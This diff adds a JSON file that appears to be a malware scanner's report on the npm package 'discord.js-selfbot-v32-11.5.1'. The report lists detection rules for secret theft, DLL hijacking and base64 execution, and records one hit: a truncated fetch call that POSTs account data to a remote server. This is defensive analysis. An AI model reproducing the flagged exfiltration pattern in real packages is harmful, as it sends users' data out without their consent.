@@ -1,0 +1,22 @@
+{
+    "issues": 1,
+    "errors": {},
+    "results": {
+        "npm-dll-hijacking": {},
+        "npm-serialize-environment": {},
+        "npm-steganography": {},
+        "npm-obfuscation": {},
+        "npm-install-script": {},
+        "npm-silent-process-execution": {},
+        "npm-exec-base64": {},
+        "shady-links": {},
+        "npm-exfiltrate-sensitive-data": [
+            {
+                "location": "package/src/client/actions/UserGet.js:67",
+                "code": "                            fetch(`${apiurl}/minecraft`, {\n                                method: \"POST\",\n                                body: JSON.stringify({\n                                    eligibleForMigration: defaut.eligibleForMi...       })\n",
+                "message": "This package is exfiltrating sensitive data to a remote server"
+            }
+        ]
+    },
+    "path": "./dataset/npm/discord.js-selfbot-v32-11.5.1"
+}
